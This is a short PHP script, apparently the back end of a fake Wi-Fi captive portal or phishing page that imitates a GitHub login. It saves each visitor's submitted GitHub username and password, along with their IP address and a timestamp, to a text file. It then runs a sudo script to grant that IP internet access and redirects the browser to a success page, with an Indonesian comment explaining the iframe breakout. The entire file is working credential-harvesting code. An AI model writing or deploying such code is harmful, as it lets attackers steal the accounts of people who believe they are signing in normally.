<?php
$ip = $_SERVER['REMOTE_ADDR'];
file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/sites/userpass/usernames.txt', "Github Username: " . $_POST['login'] . " Pass: " . $_POST['password'] . " [IP: $ip] [Time: " . date("Y-m-d H:i:s") . "]\n", FILE_APPEND);
// Whitelist the IP for internet access
exec("sudo " . escapeshellarg($_SERVER["DOCUMENT_ROOT"] . "/whitelist.sh") . " " . escapeshellarg($ip));

// Breakout dari iframe dan arahkan jendela utama ke success.html
echo '<script>window.top.location.href = "/success.html";</script>';
exit();
?>